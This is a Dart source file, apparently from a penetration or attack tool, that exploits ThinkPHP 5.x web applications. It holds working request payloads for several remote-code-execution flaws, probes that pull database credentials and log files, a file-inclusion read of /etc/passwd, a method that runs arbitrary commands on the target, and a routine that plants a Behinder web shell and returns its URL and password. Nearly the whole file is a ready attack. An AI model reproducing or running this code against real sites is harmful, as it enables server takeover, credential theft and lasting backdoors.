import 'dart:convert';

import 'package:http/http.dart' as http;

import '../../app/constants.dart';
import 'thinkphp_exp_service.dart';

class ThinkphpV5ExpService {
  final Uri baseUri;
  final Duration timeout;
  final Future<String> Function() getModule;
  final String Function(String body) extractBeforeHtml;

  ThinkphpV5ExpService({
    required this.baseUri,
    required this.timeout,
    required this.getModule,
    required this.extractBeforeHtml,
  });

  static const String _phpVersionCheck = 'PHP Version';
  static const String _tp5LogInfo = '[ info ]';
  static const String _tp5LogErr = '[ error ]';

  static final _falsePositivePatterns = RegExp(
    r'^(forbidden|403|404|not found|error|denied|unauthorized|access denied|bad request|invalid|<!doctype|<\?xml)\s*$',
    caseSensitive: false,
  );

  static Map<String, String> formMap(String s) {
    final result = <String, String>{};
    for (final part in s.split('&')) {
      final idx = part.indexOf('=');
      if (idx > 0) {
        result[part.substring(0, idx)] = part.substring(idx + 1);
      } else if (part.isNotEmpty) {
        result[part] = '';
      }
    }
    return result;
  }

  Future<ThinkphpResult> checkTp50() async {
    final mod = await getModule();
    final urls = [
      '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
      '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0 RCE', '');
  }

  Future<ThinkphpResult> checkTp5010() async {
    final mod = await getModule();
    final base = '${baseUri}?s=$mod';
    final payloads = [
      '_method=__construct&method=get&filter[]=phpinfo&get[]=-1',
      's=-1&_method=__construct&method=get&filter[]=phpinfo',
    ];
    for (final p in payloads) {
      try {
        final res = await http.post(Uri.parse(base), body: formMap(p)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.10 RCE', '$base Post: $p');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.10 RCE', '');
  }

  Future<ThinkphpResult> checkTp5022_5129() async {
    final mod = await getModule();
    final urls = [
      '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
      '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
      '${baseUri}?s=/$mod/\\think\\view\\driver\\php/display&content= ',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.22/5.1.29 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.22/5.1.29 RCE', '');
  }

  Future<ThinkphpResult> checkTp5023() async {
    final payloadUrl = '${baseUri}?s=captcha&test=-1';
    final payloads = [
      '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1',
      '_method=__ConStruct&method=get&filter[]=call_user_func&get[0]=phpinfo',
      '_method=__construct&filter[]=phpinfo&method=GET&get[]=1',
    ];
    for (final p in payloads) {
      try {
        final res = await http.post(Uri.parse(payloadUrl), body: formMap(p)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.23 RCE', '$payloadUrl Post: $p');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.23 RCE', '');
  }

  Future<ThinkphpResult> checkTp5024_5130() async {
    final mod = await getModule();
    final urls = [
      '${baseUri}?s=$mod/\\think\\Request/input&filter[]=phpinfo&data=-1',
      '${baseUri}?s=/$mod/\\think\\request/input?data[]=phpinfo()&filter=assert',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.24-5.1.30 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.24-5.1.30 RCE', '');
  }

  Future<ThinkphpResult> checkTp5Db() async {
    final mod = await getModule();
    final urls = [
      '${baseUri}?s=$mod/think\\config/get&name=database.username',
      '${baseUri}?s=$mod/think\\config/get&name=database.hostname',
      '${baseUri}?s=$mod/think\\config/get&name=database.password',
      '${baseUri}?s=$mod/think\\config/get&name=database.database',
    ];
    try {
      String? username, hostname, password, database;
      String? valid(String? s) =>
          (s != null && s.isNotEmpty && !_falsePositivePatterns.hasMatch(s.trim()))
          ? s.trim()
          : null;

      final r0 = await http.get(Uri.parse(urls[0])).timeout(timeout);
      username = r0.body.length < 20 ? valid(r0.body.trim()) : null;
      final r1 = await http.get(Uri.parse(urls[1])).timeout(timeout);
      hostname = r1.body.length < 20 ? valid(r1.body.trim()) : null;
      final r2 = await http.get(Uri.parse(urls[2])).timeout(timeout);
      password = r2.body.length < 40 ? valid(r2.body.trim()) : null;
      final r3 = await http.get(Uri.parse(urls[3])).timeout(timeout);
      database = r3.body.length < 20 ? valid(r3.body.trim()) : null;
      if (username != null || hostname != null || password != null || database != null) {
        return ThinkphpResult(
          true,
          'ThinkPHP 5.x 数据库信息泄露',
          'username:$username hostname:$hostname password:$password database:$database',
        );
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 5.x 数据库信息泄露', '');
  }

  Future<ThinkphpResult> checkTp5Log() async {
    final now = DateTime.now();
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    final urls = [
      '${baseUri}runtime/log/$y$m/${d}.log',
      '${baseUri}runtime/log/$y$m/${d}_cli.log',
      '${baseUri}runtime/log/$y$m/${d}_error.log',
      '${baseUri}runtime/log/$y$m/${d}_sql.log',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_tp5LogInfo) || res.body.contains(_tp5LogErr)) {
          return ThinkphpResult(true, 'ThinkPHP 5.x 日志泄露', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.x 日志泄露', '');
  }

  Future<ThinkphpResult> checkTp5023Debug() async {
    final payloads = [
      {'_method': '__construct', 'filter[]': 'phpinfo', 'server[REQUEST_METHOD]': '1'},
      {'_method': '__construct', 'filter[]': 'phpinfo', 'method': 'get', 'server[REQUEST_METHOD]': '1'},
    ];
    for (final body in payloads) {
      try {
        final res = await http.post(baseUri, body: body).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.23 Debug RCE', 'POST $baseUri');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.23 Debug RCE', '');
  }

  Future<ThinkphpResult> checkTp5ViewDisplay() async {
    final mod = await getModule();
    final content = Uri.encodeComponent('<?php phpinfo();?>');
    final urls = [
      '${baseUri}?s=/$mod/\\think\\View/display&content=$content&data=1',
      '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$content',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5 View/display RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5 View/display RCE', '');
  }

  Future<ThinkphpResult> checkTp5MethodFilter() async {
    final payloads = [
      {'c': 'phpinfo', 'f': '-1', '_method': 'filter'},
      {'a': 'phpinfo', 'b': '-1', '_method': 'filter'},
    ];
    for (final body in payloads) {
      try {
        final res = await http.post(baseUri, body: body).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.x _method=filter RCE', 'POST $baseUri');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.x _method=filter RCE', '');
  }

  Future<ThinkphpResult> checkTp5FileInclude() async {
    final mod = await getModule();
    final filePayloads = ['/etc/passwd', '....//....//....//....//etc/passwd', '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'];
    for (final file in filePayloads) {
      try {
        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(file)}';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains('root:') || res.body.contains('root:x:')) {
          return ThinkphpResult(true, 'ThinkPHP 5.x Lang/load 文件包含', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.x Lang/load 文件包含', '');
  }

  Future<ThinkphpResult> checkTp5ConfigGet() async {
    final payloads = ['database.username', 'database.password', 'database.hostname', 'app_debug'];
    final pathVariants = ['.|think\\config/get', 'index|think\\config/get'];
    for (final path in pathVariants) {
      for (final name in payloads) {
        try {
          final u = '${baseUri}?s=$path&name=$name';
          final res = await http.get(Uri.parse(u)).timeout(timeout);
          if (res.statusCode == 200 && res.body.isNotEmpty && res.body.length < 500 && !res.body.contains('<!DOCTYPE')) {
            final val = res.body.trim();
            if (val.isNotEmpty && !val.startsWith('{') && !val.contains('<html') && !_falsePositivePatterns.hasMatch(val)) {
              return ThinkphpResult(true, 'ThinkPHP 5.0.22 config 泄露', '$name=$val');
            }
          }
        } catch (_) {}
      }
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.22 config 泄露', '');
  }

  Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
    final mod = await getModule();
    final encodedCmd = Uri.encodeComponent(cmd);

    switch (type) {
      case ThinkphpVulnType.tp50:
        final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return extractBeforeHtml(res.body);
      case ThinkphpVulnType.tp5010:
        final base = '${baseUri}?s=$mod';
        final payload = 's=$encodedCmd&_method=__construct&method&filter[]=system';
        final res = await http.post(Uri.parse(base), body: formMap(payload)).timeout(timeout);
        return extractBeforeHtml(res.body);
      case ThinkphpVulnType.tp5022_5129:
        final u = '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;
      case ThinkphpVulnType.tp5023:
        final payloadUrl = '${baseUri}?s=captcha&test=-1';
        final payloads = [
          '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=$encodedCmd',
          's=$encodedCmd&_method=__construct&method=get&filter[]=system',
          's=$encodedCmd&_method=__construct&method&filter[]=system',
        ];
        for (final p in payloads) {
          final res = await http.post(Uri.parse(payloadUrl), body: formMap(p)).timeout(timeout);
          final out = extractBeforeHtml(res.body);
          if (out.isNotEmpty) return out;
        }
        return null;
      case ThinkphpVulnType.tp5023Debug:
        final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
        final res = await http.post(baseUri, body: body).timeout(timeout);
        return extractBeforeHtml(res.body);
      case ThinkphpVulnType.tp5ViewDisplay:
        final content = Uri.encodeComponent('<?php system(\$_GET["c"]);?>');
        final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$content&c=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return extractBeforeHtml(res.body);
      case ThinkphpVulnType.tp5MethodFilter:
        final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
        final res = await http.post(baseUri, body: body).timeout(timeout);
        return extractBeforeHtml(res.body);
      case ThinkphpVulnType.tp5FileInclude:
        final filePath = cmd.trim().isEmpty ? '/etc/passwd' : cmd.trim();
        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(filePath)}';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;
      case ThinkphpVulnType.tp5024_5130:
        final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;
      default:
        return null;
    }
  }

  Future<String?> getShell(
    ThinkphpVulnType type,
    String shellContent, {
    String password = AppConstants.defaultShellPassword,
  }) async {
    final mod = await getModule();
    const shellFile = 'php_behinder.php';
    final shellPass = password;
    final shellForAssert = shellContent.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
    final shellB64 = base64.encode(utf8.encode(shellContent));

    switch (type) {
      case ThinkphpVulnType.tp50:
        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
        final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
      case ThinkphpVulnType.tp5010:
        final base = '${baseUri}?s=$mod';
        final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
        final payloads = [
          {'_method': '__construct', 'method': 'get', 'filter[]': 'assert', 'get[]': assertCode},
          {'s': assertCode, '_method': '__construct', 'method': '', 'filter[]': 'assert'},
        ];
        for (final body in payloads) {
          await http.post(Uri.parse(base), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;
      case ThinkphpVulnType.tp5022_5129:
        final contentEnc = Uri.encodeComponent(shellContent);
        final payloads = [
          '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=$shellFile&vars[1][]=$contentEnc',
          '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=$shellFile&vars[1][1]=$contentEnc',
          '${baseUri}?s=/$mod/\\think\\template\\driver\\file/write&cacheFile=$shellFile&content=$contentEnc',
        ];
        for (final u in payloads) {
          await http.get(Uri.parse(u)).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;
      case ThinkphpVulnType.tp5023:
        final payloadUrl = '${baseUri}?s=captcha&test=-1';
        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
        final systemPayloads = [
          {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': cmd},
          {'_method': '__construct', 'filter[]': 'system', 'method': 'GET', 'get[]': cmd},
        ];
        for (final body in systemPayloads) {
          await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
        final assertPayloads = [
          {'_method': '__construct', 'filter[]': 'assert', 'method': 'GET', 'get[]': assertCode},
        ];
        for (final body in assertPayloads) {
          await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;
      case ThinkphpVulnType.tp5023Debug:
        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
        final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
        await http.post(baseUri, body: body).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
      case ThinkphpVulnType.tp5ViewDisplay:
        final phpCode = "<?php file_put_contents('$shellFile', base64_decode('$shellB64'));?>";
        final contentEnc = Uri.encodeComponent(phpCode);
        final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$contentEnc';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
      case ThinkphpVulnType.tp5MethodFilter:
        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
        final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
        await http.post(baseUri, body: body).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
      case ThinkphpVulnType.tp5FileInclude:
        return null;
      case ThinkphpVulnType.tp5024_5130:
        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
        final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
      default:
        return null;
    }
  }
}
